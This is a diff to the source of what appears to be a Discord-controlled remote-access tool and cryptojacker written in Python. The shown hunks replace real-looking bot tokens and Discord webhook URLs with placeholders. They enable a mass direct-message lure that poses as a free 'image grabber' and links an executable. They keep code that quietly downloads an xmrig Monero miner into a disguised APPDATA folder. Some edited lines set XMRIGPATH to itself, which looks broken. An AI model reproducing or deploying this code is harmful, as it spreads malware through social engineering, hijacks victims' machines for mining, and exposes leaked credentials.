@@ -50,16 +50,16 @@ USER_NAME = getpass.getuser()
 """
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
-Bot_Token = "MTAxMTcwMzMzOTQ2Mjk1OTEzNQ.Gpkcqz.Ud2ymvxYEuWWjXntgyCtk4QYJ4GSQW6fYv46bU"
+Bot_Token = "BotTokenForTheRat667"
 
 
-WEBHOOK = "https://discord.com/api/webhooks/1012430931128242199/YofCnHiXwtYIcnRR0Q1AQZbLmMazEkAyXuSdHIsbIkGtZv57zcWpJvudGG8MnsU2r5ql"
+WEBHOOK = "webhook667"
 webhook = WEBHOOK
 ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only XMR, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
-dm_all = False
+dm_all = True
 DMALLMSG = """Hey ! i am a French developer and i created the 1st free discord image grabber, would you be interessed to test it ? link : https://github.com/0xSxZuu/test/releases/download/test/image_grabber.exe"""
 mdmbot = discord.Client()
-STATSWEBHOOK = "https://discord.com/api/webhooks/1012430962799415317/QqvEDwTC4nNOAdd0YCMeVC-8_19mM1-vMbExoqxStt2k3L-bBTYutKvtbmagCYanTpwI"
+STATSWEBHOOK = "NoWebhook667EKIP"
 STATSAPI = [
 	"https://api.nanopool.org/v1/xmr/hashrate/" + str(ADDRESS),
 	"https://api.nanopool.org/v1/eth/avghashrate/" + str(ADDRESS),
@@ -733,14 +733,14 @@ if yes == "yes":
 				os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny\\update")
 				os.chdir(os.getenv('APPDATA') + "\\winedows_companny\\update")
 				if CUDA == True:
-					XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\xmrig-nvidia-2.14.5\\xmrig-nvidia.exe"
+					XMRIGPATH = XMRIGPATH
 					r = requests.get("https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrig.exe?raw=true")
 					with open(os.getenv('APPDATA') + "\\winedows_companny\\update\\curlcuda.zip", 'wb+') as f:
 						f.write(r.content)
 					with zipfile.ZipFile(os.getenv('APPDATA') + "\\winedows_companny\\update\\curlcuda.zip", 'r') as zip_ref:
 						zip_ref.extractall(os.getenv('APPDATA') + "\\winedows_companny\\update")
 				else:
-					XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\Services32.exe"
+					XMRIGPATH = XMRIGPATH
 					r = requests.get(MINERURL)
 					with open(XMRIGPATH, 'wb') as f:
 						print("Writing..")
